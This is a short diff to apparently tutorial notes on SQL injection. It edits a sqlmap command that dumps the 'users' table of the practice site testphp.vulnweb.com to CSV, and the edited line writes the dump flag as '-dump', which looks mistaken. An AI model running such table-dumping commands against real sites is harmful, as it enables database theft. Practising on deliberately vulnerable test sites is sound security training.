@@ -20,7 +20,7 @@ The following query will work as a demonstration. In my case, I obtained the tab
 
 following command is used to save table of database into .csv file extention
 
---> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {database name} --dump -T users 
+--> $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D {database name} -T users -dump 
 
 
 
